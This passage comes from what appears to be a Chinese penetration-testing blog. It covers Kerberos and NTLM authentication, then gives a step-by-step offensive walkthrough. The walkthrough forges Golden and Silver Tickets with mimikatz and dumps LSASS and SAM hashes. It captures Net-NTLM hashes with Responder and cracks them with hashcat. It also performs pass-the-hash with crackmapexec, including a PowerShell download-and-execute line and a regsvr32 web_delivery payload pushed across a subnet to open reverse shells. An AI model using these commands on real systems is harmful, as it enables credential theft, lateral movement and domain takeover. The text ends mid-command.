Key作为消息1；同时，KDC使用自己的密钥(krbtgt)加密Login Session Key和客户端信息，生成TGT，作为消息2。最后，KDC将消息1和消息2返回给客户端，即 AS_REP。这里一共返回了两个数据：\nLogin Session Key：用于下一阶段客户端与TGS (Ticket Granting Service) 通信时使用的密钥，也叫做TGS会话密钥。整体使用AD中对应帐号的密码Hash加密。\nTGT：包含Login Session Key、客户端信息、时间戳、TGT有效期。整体使用krbtgt账户密码的Hash进行加密\n\n\n客户端接收到返回的两个消息之后，使用自己的密码hash对消息1进行解密，如果用户提供的凭证是正确的，则解密成功，此时用户得到了Login Session Key以及加密后的TGT。\n\n\nNote：KDC自己的密钥，宏观上来说就是默认域账户krbtgt密码的NTML Hash，这个密钥只存在于域控制器上，因此KDC返回给客户端的TGT正常情况情况下只有自己才能解密 ，并且TGT是具有时间戳属性及有效期的，超过了有效期则需要重新申请。\n第一阶段结束后，客户端获取到了Login Session Key以及加密的TGT，开始进入下个阶段，请求获取Ticket服务票据。\nAS-REP 中最核心的东西就是 Session-key 和 TGT。我们平时用 Mimikatz、kekeo、rubeus 等工具生成的凭据是 .kirbi 后缀，Impacket 生成的凭据的后缀是 .ccache。这两种票据主要包含的都是 Session-key 和 TGT，因此可以相互转化。\n\n第二阶段：向TGS请求Ticket服务票据(TGS_REQ &amp; TGS_REP)\n\n客户端把用户名、使用Login Session Key加密的Authenticator、加密的TGT、要访问的服务器信息发送给KDC，请求获取Ticket。这里一共发送了四个数据：\n用于进行登录的用户名\n使用Login Session Key加密的Authenticator信息\n第一阶段获取到的加密的TGT\n要访问的服务器名信息\n\n\nKDC收到请求之后，在AD (Account Database，帐户数据库) 查找该用户名，如果存在该用户，KDC会使用自己的密钥解密TGT，在解密的TGT中获取到TGS会话密钥（即Login Session Keyy），进而使用Login Session Key对Authenticator进行解密，如果解密成功，则验证了对方的真实身份。此时KDC会生成一个Service Session Key(服务会话密钥)，以及Server Ticket。最后KDC用Logon Session 加密Service Session Key作为消息1；使用用户密码的Hash加密Ticket票据，作为消息2。然后把消息1和消息2返回给客户端 。\nService Session Key：用于下一阶段客户端与服务器通信，也叫做SS会话密钥，整体使用Logon Session Key加密\nServer Ticket：服务票据，包含Service Session Key和客户端信息。用于下一阶段客户端访问服务器的凭证。整体使用服务器密码的Hash进行加密\n\n\n客户端收到消息后，利用自己缓存的Logon Session Key解密Service Session Key，同时它也得到了用服务器密码Hash加密的Ticket。\n\n\nNote：第二阶段结束后，客户端拿到了Service Session Key以及加密的Ticket，这个Ticket使用服务器密码的Hash进行加密。只有域控制器和服务器能够进行解密。下面进入第三阶段，客户端凭借Ticket访问服务器上的资源。\n\n第三阶段：通过Ticket访问服务器(AP-REQ &amp; AP-REP)\n\n客户端向服务器发送以下两条消息：\n加密的ticket\n用Service Session Key加密的Authenticator信息\n\n\n服务器收到消息之后，会用自己的密码Hash对Ticket进行解密，获取到Ticket中的Service Session Key，然后使用Service Session Key对Authenticator进行解密，如果解密成功，则认证了用户身份，此时便将这个加密的Ticket缓存到自己的内存中，并且把解密后的Authenticator用Service Session Key重新加密，数据不变，然后把加密的Authenticator发送给客户端。\n客户端收到消息后，用缓存的Service Session Key对Authenticator进行解密，如果其中的数据和之前一样，则验证了服务器端的身份。\n\n至此，客户端与服务器就完成了一次完整的握手过程，建立了TCP连接，在之后的访问过程中，客户端只要在请求数据包中携带加密的Ticket信息，即可无需再进行认证。\nKerberos认证过程中的弱点​    如果你认真阅读并理解了Kerberos认证流程，就可以知道，Kerberos认证的安全性并非是无懈可击的，如果认证过程中的Ticket被伪造，依旧会带来安全问题，这就是常见的票据传递攻击（Pass-The-Ticket），只是这些伪造需要满足一些前提条件。\n黄金票据（Golden Ticket）​    整体回顾三个阶段的认证流程，我们可以发现，在第一阶段中，KDC自己的密钥，即默认域管理员帐号krbtgt的密码Hash参与生成TGT，那么如果我们拥有krbtgt帐号密码的Hash，就可以任意伪造TGT票据，那么之后的认证过程也能由我们任意控制，进而可以任意颁发票据访问个域成员主机的服务。不过实现这些的前提是我们能够拿下域控制器，获得krbtgt密码的Hash。在这个阶段被伪造的TGT票据，被叫做黄金票据（Golden Tickets）。\n白银票据（Silver Ticket）​    在第二阶段的认证过程中，最后客户端拿到了Service Session Key以及加密的Ticket，这个Ticket使用服务器密码的Hash进行加密，那么如果我们拥有服务器密码的Hash，我们就可以伪造一个加密的Server Ticket，利用这个伪造的Ticket，参与第三阶段的认证过程。在这个阶段被伪造的Server Ticket被称为白银票据（Silver Ticket）。\nGolden Ticket与Silver Ticket的不同之处：\n\n访问权限不同 ： Golden Ticket是伪造的TGT，可访问任何域成员服务；Silver Ticket是伪造的TGS，只能访问特定主机的服务。\n\n加密方式不同 ： Golden Ticket是用域 Kerberos 服务帐户 ( krbtgt)加密的；而Silver Ticket是由服务帐户（从计算机的本地SAM或服务帐户凭据中提取的计算机帐户凭据）加密的。\n\n认证流程不同： Golden Ticket的获取使用需要与域控通信；Silver Ticket的使用不需要与域控通信。\n\n\n对比来看，伪造黄金票据，能够攻击除了域控制器之外的其他所有域服务器，实现持久化隐藏和控制这个域，危害巨大，但是前提需要先拿到域控制器的权限。 而伪造白银票据，仅能够攻击特定的服务器，但是伪造白银票据的难度比伪造黄金票据的难度较小，因为通常来说服务器部署了更多的应用，安全性较域控制器来说相对更低。\nPass-The-Ticket Attack伪造黄金票据mimikatz1.首先我们需要先拿到krbtgt帐号的NTML Hash\nmimikatz.exe &quot;privilege::debug&quot; &quot;lsadump::dcsync /user:krbtgt&quot; exit &gt; krbtgt.txt# ormimikatz.exe &quot;lsadump::lsa /inject /name:krbtgt&quot; exit &gt; krbtgt.txt\n\n接下来准备伪造黄金票据，mimikatz伪造黄金票据需要一些必要的参数：\n\n/domain - 域名\n/sid-  域SID\n/user - 要模拟的用户名，可以任意\n/rc4 or /krbtgt - krbtgt 账户的 NTLM hash\n/ptt - 在当前会话中注入票据\n/ticket- 可选 - 导出票证 ，默认文件名为：ticket.kirbi\n/id - 可选  - 用户的ID ，默认为：500(默认管理员ID)\n/groups- 可选  - 用户所属组的ID ，默认为513,512,520,518,519(常见默认管理员组)\n\n\nNote：SID全称Security Identifiers(安全标识符)，用于标识用户或组。要获取域SID，我们可以查询用户的SID，去掉最后几位RID即可，可以使用whoami /user、wmic useraccount get name,sid查看。实际上刚才我们可以直接从mimikatz获取的krbtgt的SID中查看。\nWindows系统帐户对应固定的RID：500：Administrator501：Guest502：krbtgt (域环境)512：Domain Admins (域环境)513：Domain Users (域环境)514：Domain Guests (域环境)515：Domain Computers (域环境)516：Domain Controllers (域环境)\n\n\nkerberos::list\t\t#列出票据kerberos::purge\t\t#清除所有票据# 伪造票据mimikatz.exe &quot;kerberos::golden /user:wowowo /domain:&lt;域名&gt; /sid:&lt;域SID&gt; /krbtgt:&lt;krbtgt&#x27;s ntml hash&gt; /ptt&quot;mimikatz.exe &quot;kerberos::golden /user:hacker /domain:ssooking.com /sid:S-1-5-21-4168241775-2339322854-2282195709 /krbtgt:f83726428e45eceead37a334aef1dc3a /ptt&quot;\n\n正常情况下，我们访问服务器的共享目录会弹出认证框进行身份认证，当我们伪造票据之后，再次访问域服务器DM1的共享目录时，发现无需认证即可访问。\n\n或者使用net use直接映射服务器的磁盘，此时也无需提供口令凭证。\nnet use x: \\\\Win2008-dm1\\D$\n\n其他方法\n通过mimikatz导出域控制器内存中的Ticket： \nsekurlsa::tickets /export\n\n挑选其中的某个kirbi文件，在域普通用户的主机进行导入\nmimikatz.exe &quot;kerberos::ptt C:\\test\\xxxx.kirbi&quot;\n\nMetasploit使用meterpreter中的kiwi模块：\nmeterpreter&gt; load kiwimeterpreter&gt; kerberos_ticket_list\t#列出票据meterpreter&gt; kerberos_ticket_purge\t#清除所有票据# 伪造票据meterpreter&gt; golden_ticket_create -u &lt;username&gt;  -d &lt;domain&gt; -k &lt;krbtgt ntml hash&gt; -s &lt;domain SID&gt; -t /tmp/krbtgt.ticketmeterpreter&gt; kerberos_ticket_use /tmp/krbtgt.kirbi\n\n\n伪造白银票据伪造白银票据需要先获取目标服务账户的hash，以mimikatz为例：\nmimikatz.exe &quot;privilege::debug” &quot;sekurlsa::logonpasswords&quot; &quot;exit&quot; &gt; log.txt\n\nmimikatz可以用来伪造银票，同样是使用kerberos::golden，但是指定的是服务帐户的密码哈希值，不是krbtgt的hash。mimikatz伪造白银票据需要一些必要的参数：\n\n/domain - 域名\n/sid-  域SID\n/user - 要模拟的用户名，可以任意\n/target – 目标服务器域名\n/service – 目标服务主体名称（参考）\n/rc4   服务账户NTLM hash\n/ptt - 在当前会话中注入票据\n\n使用mimikatz伪造白银票据，并将其注入到cmd.exe会话中：\nPS&gt; .\\mimikatz.exe &quot;kerberos::golden /user:random_user /domain:domain.com /sid:S-1-5-21-5840559-2756745051-1363507867 /rc4:8fbe632c51039f92c21bcef456b31f2b /target:FileServer1.domain.com /service:cifs /ptt&quot; &quot;misc::cmd&quot; exit\n\n\n\n\n\n检测与防御\nPTT产生的安全事件：https://jpcertcc.github.io/ToolAnalysisResultSheet/details/RemoteLogin-Mimikatz.htm\nhttps://www.qomplx.com/qomplx-knowledge-silver-ticket-attacks-explained/\n\n参考链接\nMicrosoft Kerberos\nHow the Kerberos Version 5 Authentication Protocol Works\nActive Directory Domain Services\nWindows安全认证是如何进行的？Kerberos篇\n彻底理解Windows认证\nKerberos的黄金票据详解\n内网渗透 | Kerberos 协议与 Kerberos 认证原理\nhttps://attack.stealthbits.com/how-golden-ticket-attack-works\nhttps://attack.stealthbits.com/silver-ticket-attack-forged-service-tickets\nhttps://adsecurity.org/?p=1515\nhttps://book.hacktricks.xyz/windows/stealing-credentials/credentials-mimikatz\nhttps://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/kerberos-silver-tickets\nhttps://en.hackndo.com/kerberos-silver-golden-tickets/\n\n","categories":["攻防渗透"],"tags":["内网渗透","域渗透"]},{"title":"域渗透之NTML","url":"/2018/12/%E5%9F%9F%E6%B8%97%E9%80%8F%E4%B9%8Bntml/","content":"一、认识Windows HASH​    早期SMB协议在网络上传输明文口令。后来出现”LAN Manager Challenge&#x2F;Response”验证机制，简称LM，它非常简单很容易被破解，现在已经废弃。微软提出了Windows NT挑战&#x2F;响应验证机制，称之为NTLM。现在已经有了更新的NTLMv2以及Kerberos验证体系。Windows加密过的密码口令，我们称之为hash（中文：哈希），Windows的系统密码hash默认情况下一般由两部分组成：第一部分是LM hash，第二部分是NTLM hash。\nLM HASH​    LM HASH是一种较古老的Hash，在LAN Manager协议中使用，非常容易通过暴力破解获取明文凭据。Vista以前的Windows OS使用它，Vista之后的版本默认禁用了LM协议，但某些情况下还是可以使用。\n补充：\nWindows Vista和Windows Server 2008以前的系统还会使用LM hash。LM hash的生成方法本文暂不介绍。自Vista和2008开始，Windows取消LM hash，但某些工具的参数需要填写固定格式LM hash:NT hash，可以将LM Hash填0(LM hash可以为任意值)，即00000000000000000000000000000000:NT hash\nNTLM HASH​    NTLM Hash（NT LAN Manager）是支持Net NTLM认证协议及本地认证过程中的一个重要参数。其长度为32位，由数字与字母组成。它的前身是LM Hash，目前基本淘汰，两者相差不大，只是使用的加密算法不同。\n本地认证：Windows不存储用户的明文密码，它会将用户的明文密码经过加密后存储在SAM (Security Account Manager Database，安全账号管理数据库)中。SAM文件的路径是%SystemRoot%\\system32\\config\\sam。在进行本地认证的过程中，当用户登录时，系统将用户输入的明文密码加密成NTLM Hash，与SAM数据库中的NTLM Hash进行比较，从而实现认证。\n\nNote：在域环境下，DC (Domain Controller，域控制器)中也存在这样的数据库AD (Account Database)，位于ntds.dit文件。该文件包含用户对象、组和组成员身份信息、域中所有用户的密码哈希。\n\nNTLM是一种网络认证协议，与NTLM Hash的关系就是：NTLM网络认证协议是以NTLM Hash\b作为根本凭证进行认证的协议。在本地认证的过程中，其实\b就是将用户输入的密码转换为NTLM Hash与SAM中的NTLM Hash进行比较。通常意义上的NTLM Hash指存储在SAM数据库及NTDS数据库中对密码进行Hash摘要计算后的结果，这类Hash可以直接用于PTH，并且通常存在于LSASS进程中，便于SSP使用。\n本地认证流程\nwinlogon.exe -&gt; 接收用户输入 -&gt; lsass.exe -&gt; (认证)\n\n首先，用户注销、重启、锁屏后，操作系统会让winlogon显示登录界面，也就是输入框，\b接收输入后，\b将密码交给lsass进程，这个进程中会存一份明文密码，将明文密码加密成NTLM Hash，对比SAM数据库中的hash进行验证。\n\nWindows Logon Process(即 winlogon.exe)，是Windows NT 用户登 陆程序，用于管理用户登录和退出。\nLSASS用于微软Windows系统的安全机 制。它用于本地安全和登陆策略。\n\n在系统中，hash格式是类似这样的：\nssooking:1001:AAD3B435B51404EEAAD3B435B51404EE:AFC44EE7351D61D00698796DA06B1EBF:::Administrator:500:AAD3B435B51404EEAAD3B435B51404EE:32ED87BDB5FDC5E9CBA88547376818D4:::\n\nNTLM-Hash的生成用户密码为test123\n转换成十六进制的格式为74657374313233\n转换成Unicode格式为7400650073007400310032003300\n对字符串7400650073007400310032003300以十六进制格式作MD4加密，结果为c5a237b7e9d8e708d8436b6148a25fa1\n注：\nMD4加密可使用工具HashCalc，如下图\nIBM设计的LM Hash算法存在几个弱点，微软在保持向后兼容性的同时提出了自己的挑战响应机制，NTLM Hash便应运而生。假设明文口令是123456，首先转换成Unicode字符串，与LM Hash算法不同，这次不需要添加0补足14字节\n123456 -&gt; 310032003300340035003600。\n\n从ASCII串转换成Unicode串时，使用little-endian(小端)序。0x80之前的标准ASCII码转换成Unicode码，就是简单地从0x??变成 0×00??。此类标准ASCII串按little-endian序转换成Unicode串，就是简单地在原有每个字节之后添加0×00。\n\n对所获取的 Unicode串进行标准MD4单向哈希，无论数据源有多少字节，MD4固定产生128-bit的哈希值，\n16字节 310032003300340035003600- 进行标准MD4单向哈希 -&gt; 32ED87BDB5FDC5E9CBA88547376818D4，\n就得到了最后的NTLM Hash：32ED87BDB5FDC5E9CBA88547376818D4\n实验环境下，测试服务器可以先关闭密码复杂性策略，设置一个简单的密码。\n\ngpedit.msc – 本地组策略编辑器 – 计算机配置 - windows设置 - 安全设置 - 帐户策略 - 密码策略\n\n后文以Adminstrator NTML Hash 为例。明文密码为toor\nAdministrator:500:AAD3B435B51404EEAAD3B435B51404EE:AFC44EE7351D61D00698796DA06B1EBF:::\n\n\n\n二、NTML网络认证机制NTLM 协议​    NTLM是除Kerberos之外的一种网络认证协议，只支持Windows。它是一种基于质询&#x2F;应答 (Challenge&#x2F;Response)消息交换模式的认证机制， 常用于工作组和域环境下登录场景的身份认证。\n基于NTML协议的身份认证机制​    NTML网络认证采用质询&#x2F;应答 (Challenge&#x2F;Response) 模式进行数据交换，通过传输加密的Challenge/Response值并进行对比，从而验证用户身份。NTML网络认证会使用用户密码的Hash作为密钥，来加密Challenge，用户只有在输对密码的情况下，才能够同样利用密码的hash进行解密。这样通过对比两端的计算结果来判断凭据是否有效，从而实现身份认证。这样的好处是，用户的密码不会在网络链路中传输，加密之后的Challenge值取代原本密码的作用进行对比验证，与传统传输密码的方式相比，具有较高的安全性。\n通过交互过程中维护的凭证（credential），包括域名、用户名、用户密码的hash串\n\nps：域名信息会自动在数据包中携带，无需用户手动输入。\n\nNTLM的认证过程分为三步：协商、质询、验证：\n\n协商：主要用于确认双方协议版本\n质询：质询&#x2F;应答 (Challenge&#x2F;Response) 模式，用于消息交换\n验证：验证身份合法性，通常由Server端或域控制器完成这个过程\n\nNTML的认证方式分为Interactive（交互式）和Noninteractive（非交互式）：\n交互式验证：交互式提供必要凭据，通常应用场景通常为登录，即用户要登录某台客户端。\n非交互式验证：无需交互式提供凭据，在实际应用中，比如命令行直接指定用户名、密码的方式登录，再比如我们在客户端上使用net use命令去映射服务器上某个共享文件夹的方式，这些便属于属于非交互式认证。但非交互式认证的应用场景更多的是已登录某客户端的用户去请求另一台服务器的资源 ，或者为单点登录（SSO）的方式，即用户只需要登录一次即可访问所有相互信任的应用系统及共享资源。\nnet use x: \\\\17.10.0.10\\$share /u:administrator password\n\n\n\nNTML认证机制在工作组环境下和在域环境下是不同的。\n​    工作组和域宏观上都是一群计算机的集合，域中计算机的数量规模通常大于工作组内的计算机。在认证体系中，工作组和域的主要区别在于，工作组内的机器名义上虽然是属于一个集合，但是内部各计算机还是各自管理各自的，没有一个相对成熟的信任机制，工作组内各个计算机的关系依旧是点对点的。因此，在工作组环境下进行访问认证，仅涉及Client和Server。我们使用的个人计算机，默认便处于WORKGROUP工作组环境下。\n​    域是一个有安全边界的计算机集合，同一个域中的计算机通过共同的第三方信任机构建立信任关系，这个第三方信任机构角色由DC (Domain Controller，域控制器) 担当。通俗来讲，域中的机器都信任域控制器，那么只要域控制器信任我们，我们就可以在域内获得对其他服务器的访问权限。在这种认证体系中涉及三方：Client、Server、DC 。\n\n注意：在Windows域环境下涉及三方的访问认证场景中，即客户端想要访问服务器资源的情况下，采用 基于Kerberos协议的网络认证机制，NTML认证机制参与认证过程。此部分详细内容请参考域渗透之Kerberos 。\n\n​    下面我们就来分别介绍一下在工作组和域环境下，基于NTML协议的网络认证机制的工作流程。以交互式为例。\n工作组环境NTML认证流程工作组中，涉及Clinet、Server，流程如下：\n\n用户访问客户端计算机并输入用户名和密码信息，尝试进行登录\n客户端计算机对密码进行哈希处理并缓存密码hash，丢弃实际的明文密码(不存储)，然后将用户名发送到服务器，发起认证请求\n服务器生成一个16字节的随机数，称为质询 (challenge) 或随机数 (nonce)，并将challenge发送给客户端\n客户端使用缓存的用户密码的哈希值对此challenge进行加密，加密结果为Response (响应)，然后将Username、Challenge、Response（Net-NTML hash）发送给服务器。\n服务器使用username从SAM帐户数据库中检索用户密码的hash，使用该hash来加密challenge，并与客户端计算的响应值进行比较。如果它们相同，则验证成功。\n\n域环境NTML认证流程在域环境下多了域控制器的角色，微软给出的说明是这样的：\n\n\n(Interactive  authentication only) A user accesses a client computer and provides a  domain name, user name, and password. The client computes a  cryptographic hash of the password and discards the actual password.\nThe client sends the user name to the server (in plaintext).\nThe server generates a 16-byte random number, called a challenge or nonce, and sends it to the client.\nThe client encrypts this challenge with the hash of the user’s  password and returns the result to the server. This is called the response.\nThe server sends the following three items to the domain controller:\nUser name\nChallenge sent to the client\nResponse received from the client\n\n\nThe domain controller uses the user name to retrieve the hash of  the user’s password from the Security Account Manager database. It uses  this password hash to encrypt the challenge.\nThe domain controller compares the  encrypted challenge it computed (in step 6) to the response computed by  the client (in step 4). If they are identical, authentication is  successful.\n\n\n翻译过来流程大致如下：\n\n用户访问客户端计算机并输入用户名和密码信息，尝试进行登录\n客户端计算机对密码进行哈希处理并缓存密码hash，丢弃实际的明文密码(不存储)，然后将用户名发送到服务器，发起认证请求\n服务器生成一个16字节的随机数，称为质询 (challenge) 或随机数 (nonce)，并将challenge发送给客户端\n客户端使用缓存的用户密码的哈希值对此challenge进行加密，加密结果为Response (响应)，然后将Username、Challenge、Response（Net-NTML hash）发送给服务器\n服务器将Username、Challenge、Response（Net-NTML hash）发送给DC (Domain Controller，域控制器)\nDC域控制器从AD (Account Database，帐户数据库) 中检索该用户名，并提取用户密码的NTML hash，使用该hash来加密challenge，并且把这个值和客户端计算的响应值进行比较。如果它们相同，则验证成功。\n\n三、如何拿到Hash?1.本地获取在渗透测试中，通常可从Windows系统中的SAM文件和域控的NTDS.dit文件中获得用户hash，通过读取lsass.exe进程能获得已登录用户的NTLM hash。许多工具能够方便地为我们完成这些工作。但需要注意的是大部分抓取hash的工具都需要管理员权限。\n常用工具：\n\nQuarksPwDump\nMimikatz\nProDump\nMetasploit\nCobaltstrike\n\nQuarksPwDumpquarkspwdump.exe -dhl\n\nMimikatzprivilege::debugsekurlsa::logonpasswords\n\n更方便的mimikatz命令\nmimikatz.exe &quot;privilege::debug&quot; &quot;sekurlsa::logonpasswords full&quot;\n\n执行以下命令除了回显，还可以dump结果并将hash保存为log日志文件：\nmimikatz.exe &quot;privilege::debug&quot; log &quot;sekurlsa::logonpasswords full&quot; exit\n\nProDumpprodump是微软提供的一个命令行实用程序，用于监视应用程序并生成故障转储。我们可以用它先dump对方主机的LSASS内存文件，然后在自己主机用mimikatz等工具进行处理。这种方式的好处是可以避免被查杀。先转储LSASS内存文件：\nprocdump.exe -accepteula -ma lsass.exe lsass.dmp\n\n然后本地用mimikatz对LSASS内存文件进行破解：\nmimikatz.exe &quot;sekurlsa::minidump lsass.dmp&quot;sekurlsa::logonpasswords\n\n类似ProDump的工具还有：fgdump、pwdump、cachedump等。\n利用powershell也能够像Prodump一样转储lsass文件：\npowershell IEX (New-Object Net.WebClient).DownloadString(&#x27;https://raw.githubusercontent.com/mattifestation/PowerSploit/master/Exfiltration/Out-Minidump.ps1&#x27;); &quot;Get-Process lsass | Out-Minidump&quot;\n\nMetasploit首先需要获取SYSTEM权限\nmeterpreter &gt; getuidmeterpreter &gt; getsystem...got system via technique 1 (Named Pipe Impersonation (In Memory/Admin)).meterpreter &gt; getuidServer username: NT AUTHORITY\\SYSTEM\n\n在metasploit中利用mimikatz获取hash\nmeterpreter &gt; load mimikatzmeterpreter &gt; mimikatz_command -f samdump::hashes\n\nmetasploit提供的抓取hash的一些模块：\nmeterpreter &gt; run post/windows/gather/hashdumpmeterpreter &gt; run post/windows/gather/smart_hashdump\n\nsmart_hashdump模块会把dump的hash文件保存在/root/.msf4/loot目录下，并且该模块一定程度上能够绕过windows UAC。\n顺便介绍一些能够直接获取明文密码的模块命令：\nmeterpreter &gt; load mimikatzmeterpreter &gt; wdigest （kerberos）meterpreter &gt; mimikatz_command -f samdump::hashesmeterpreter &gt; mimikatz_command -f sekurlsa::searchPasswords meterpreter&gt;load kiwimeterpreter&gt; creds_wdigest\n\nCobaltstrikebeacon&gt; getuidbeacon&gt; powershell-import /root/powershell/Get-PassHashes.ps1beacon&gt; powershell Get-PassHashes\n\n\n\n 读取hash，需要administer权限(右击目标主机–Access-hashdump)\nbeacon&gt; wdigest //读取信息beacon&gt; hashdump  \n\n运行mimikatz(右击目标主机–Access- RUN mimikatz)\nbeacon&gt; logonpasswords \n\n右击受害者主机–access-hashdump\nbeacon&gt; powershell-import /root/powershell/Inveigh/Inveigh.ps1beacon&gt; powershell Invoke-Inveigh -ConsoleOutput Y -FileOutput Y -NBNS Y -mDNS Y -LLMNR Y -HTTP Y -PROXY Y\n\n2.网络欺骗通常我们采用网络欺骗技术，配合受害者交互的方式窃取到是Net-NTLM Hash。这类hash并不能直接用于pass-the-hash攻击，但可以通过暴力破解的方式来获取明文密码。关于更多获取Net-NTML HASH的技巧，可以参考\n常用工具：\n\nResponder\nMetasploit\n\nResponderresponder可以伪造服务，对相关请求进行响应。开启命令：\nresponder -I eth0\n\n实战环境下，我们应该修改/etc/responder/Responder.conf配置文件，关闭其中的一些不必要的服务，从而减少网络流量，并产生针对性日志，如：\n; Servers to startSQL = OffSMB = OnKerberos = OnFTP = OffPOP = OffSMTP = OffIMAP = OffHTTP = OnHTTPS = OnDNS = OnLDAP = On\n\n针对测试而言，我们还可以设置Challenge值，以便观察流量格式：\nChallenge = 1122334455667788\n\n开启监听后，当用户进行了交互，如在资源管理器中以UNC路径形式访问伪造的服务器：\n\n此时会弹出虚假认证界面，此时无论受害者是否输入凭据，我们都已经获取了NET NTML Hash。responder默认会将日志保存在/usr/share/responder/logs下，hash记录文件以HTTP-NTLMv2   SMBv2-NTLMv2等前缀开头。\n\n在渗透测试中，我们还可以通过其他技巧获取Net-NTML Hash，如：\n\n命令执行：regsvr32、powershell等\n钓鱼文档：doc、docx、pdf\n后门设置：\n\n例：\nregsvr32 /s /u /i://17.10.0.1/@abc hello.dllpowershell -c &quot;Invoke-Item \\\\17.10.0.1\\aa&quot;powershell -nop -exec bypass -c &quot;Invoke-Item \\\\17.10.0.1\\aa&quot;Invoke-Item \\\\192.168.0.1\\aaGet-Content \\\\192.168.0.1\\aaStart-Process \\\\192.168.0.1\\aa \n\n\n\n3.其他技巧还有许多其他Credential Dumping姿势，可以参考：\ndumping-domain-password-hashes\nPlaces of Interest in Stealing NetNTLM Hashes 及译文 花式窃取NetNTLM哈希的方法\n四、如何利用Hash？在拿到hash之后，我们一般会考虑破解出hash明文密码，或者利用pass-the-hash技术在无需明文密码的情况下进行特权操作。\n1.解密Hash在线解密下面是一些提供在线解密的站点：\n\nhttps://www.cmd5.com/\nhttps://crack.sh/get-cracking/\nhttp://hashcrack.com/index.php\nhttp://cracker.offensive-security.com/index.php\nhttp://www.objectif-securite.ch/en/ophcrack.php\n\n本地破解我们还可以使用john、hashcat等工具，通过hash表、字典等进行本地破解。当工具内置的hash字典无法成功破解时，我们可以使用自己搜集的字典文件，或者利用社工等方法针对性生成hash字典。\nJohnjohn HTTP-NTLMv2-17.10.0.10.txt\n\n\nHashcat使用hashcat -h命令查看帮助，必要的参数有：\n-m  hash类型\nLM：3000 NTLM：1000NetNTLMv1：5500NetNTLMv2：5600 \n\nNTLMv1的格式为：\nusername::hostname:LM response:NTLM response:challenge\n\n构造后的数据如下：\nlog1::WIN-BH7SVRRDGVA:fec9b082080e34ba00000000000000000000000000000000:51acb9f9909f0e3c4254c332f5e302a38429c5490206bc04:8d2da0f5e21e20ee\n\nHashcat参数如下：\nhashcat -m 5500 log1::WIN-BH7SVRRDGVA:fec9b082080e34ba00000000000000000000000000000000:51acb9f9909f0e3c4254c332f5e302a38429c5490206bc04:8d2da0f5e21e20ee /tmp/password.list -o found.txt --force\n\n下面，使用Hashcat对该Net-NTLM hash进行破解。NTLMv2的格式为：\nusername::domain:challenge:HMAC-MD5:blob\n\n\n值得一提的是，在真实渗透环境下，由于密码复杂度限制，一般我们获取到的NTML-HASH很难直接破解出明文密码，这种情况下我们需要采用其他技术继续进行横向渗透。\n\n其他破解工具\nhttps://www.trustedsec.com/blog/summerof2018/\n2.Pass-The-Hash哈希传递是能够在不需要账户明文密码的情况下完成认证的一个技术。渗透中当我们获取不到明文密码，或者破解不了NTLM Hash的情况下，哈希传递攻击能够使我们利用这些哈希继续进行横向渗透。PTH是基于IPC远程连接实现，只能使用被添加到远程计算机管理员组的域用户来远程连接\n常见PTH工具： \n\nCrackmapexec\nMimikatz\nsmbmap\nsmbexec\nmetasploit\ncobaltstrike\n\ncrackmapexecWindow版本：\nhttps://github.com/MichaelKCortez/CrackMapExecWin\nhttps://github.com/maaaaz/CrackMapExecWin\n1.安装 crackmapexec\napt-get install crackmapexec(pip install crackmapexec)\n\n2.使用 crackmapexec\ncme smb -h\n\n批量扫描探测命令：\ncme smb 17.10.0.10/24cme smb 17.10.0.10 -u administrator -H hash.txtcme smb 17.10.0.100-200 -u administrator -H AFC44EE7351D61D00698796DA06B1EBF\n\n执行命令：\ncme smb 17.10.0.10  -u administrator -p toor(明文密码) -x whoamicme smb 17.10.0.10  -u administrator -H afc44ee7351d61d00698796da06b1ebf -x whoami\n\n其他参数\n--shares\t#枚举共享和访问权限--sessions\t#枚举活动会话--disks\t\t#枚举磁盘--sam \t\t#dump目标系统中的SAM哈希值--loggedon-users\t#枚举登录用户--users [USER]\t\t#枚举域用户(如果指定了用户只查询其信息)--groups [GROUP]\t\t#枚举域组(如果指定了组其成员被列举)--local-groups [GROUP]  #如果指定了组则枚举本地组其成员被列举--local-groups [GROUP]\t#枚举本地组，如果指定了组，则枚举其成员-x COMMAND\t\t\t\t#执行指定的命令-X PS_COMMAND\t\t\t#执行指定的PowerShell命令-L， --list-modules\t#列出可用的拓展功能模块--options\t#查看模块选项-M MODULE， --module MODULE\t #使用拓展功能模块-o MODULE_OPTION [MODULE_OPTION ...] #设置模块选项\n\nGETSHELL\n利用拓展功能模块，我们可以方便地getshell。我们可以使用cme smb -L命令查看所有moudules，对应的物理路径为：\n/usr/local/lib/python2.7/dist-packages/crackmapexec-4.0.1.dev0-py2.7.egg/cme/modules\n\n其中提供的met_inject.py模块可以使目标下载执行Meterpreter stager，我们先来看下模块需要的参数：\n$ cme smb -M met_inject --options[*] met_inject module options:    LHOST    IP hosting the handler    LPORT    Handler port    PAYLOAD  Payload to inject: reverse_http or reverse_https (default:reverse_https)    PROCID   Process ID to inject into (default: current powershell process)\n这是一个http或https的反弹shell，我们使用默认的reverse_https，提供需要的LHOST和LPORT的参数即可：\ncme smb 17.10.0.10-150 -u administrator -H AFC44EE7351D61D00698796DA06B1EBF -M met_inject -o LHOST=17.10.0.1 LPORT=9999\n\n命令的意思是通过pass-the-hash批量攻击17.10.0.10-17.10.0.150网段的主机，并使其执行meterpreter的https反弹shell。\n笔者测试时遇到问题，无法用met_inject.py模块正常getshell，不知道什么原因。因此选择直接通过命令执行getlshell。利用metasploit的web_delivery模块：\nuse exploit/multi/script/web_deliveryset payload windows/x64/meterpreter/reverse_tcpset LHOST 17.10.0.1set LPORT 9999set target 3run[*] Exploit running as background job 0.[*] Started reverse TCP handler on 17.10.0.1:9999 [*] Using URL: http://0.0.0.0:8080/1KZkey[*] Local IP: http://10.204.146.152:8080/1KZkey[*] Server started.[*] Run the following command on the target machine:regsvr32 /s /n /u /i:http://17.10.0.1:8080/1KZkey.sct scrobj.dll\n\n通过pass-the-hash执行命令批量getshell\ncme smb 17.10.0.10-15 -u administrator -H AFC44EE7351D61D00698796DA06B1EBF -x &quot;regsvr32 /s /n /u /i:http://17.10.0.1:8080/1KZkey.sct scrobj.dll&quot;\n\n\nMetasploitsearch psexec，smblogin\nuse exploit/windows/smb/psexec set payload windows/meterpreter/bind_tcpset RHOST 17.10.0.10set smbuser administratorset smbpass AAD3B435B51404EEAAD3B435B51404EE:AFC44EE7351D61D00698796DA06B1EBFexploituse exploit/windows/smb/psexec_pshset payload windows/meterpreter/bind_tcpset RHOST 17.10.0.10set smbuser administratorset smbpass 